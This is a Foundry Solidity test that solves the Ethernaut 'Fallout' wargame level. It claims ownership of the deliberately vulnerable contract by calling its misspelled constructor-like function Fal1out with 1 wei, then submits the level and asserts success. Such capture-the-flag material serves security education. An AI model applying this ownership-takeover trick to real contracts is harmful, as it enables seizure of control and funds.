pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "src/core/Ethernaut.sol";
import {FalloutFactory} from "src/levels/Fallout/FalloutFactory.sol";
import {Fallout} from "src/levels/Fallout/Fallout.sol";

contract FalloutTest is Test {
  Ethernaut ethernaut;
  address eoaAddress = address(100);

  function setUp() public {
    // Setup instance of the Ethernaut contracts
    ethernaut = new Ethernaut();
    // Deal EOA address some ether
    vm.deal(eoaAddress, 5 ether);
  }

  function testFalloutHack() public {
    /////////////////
    // LEVEL SETUP //
    /////////////////

    FalloutFactory falloutFactory = new FalloutFactory();
    ethernaut.registerLevel(falloutFactory);
    vm.startPrank(eoaAddress);
    address levelAddress = ethernaut.createLevelInstance(falloutFactory);
    Fallout ethernautFallout = Fallout(payable(levelAddress));

    //////////////////
    // LEVEL ATTACK //
    //////////////////
    ethernautFallout.Fal1out{value: 1 wei}();

    //////////////////////
    // LEVEL SUBMISSION //
    //////////////////////

    bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(levelSuccessfullyPassed);
  }
}
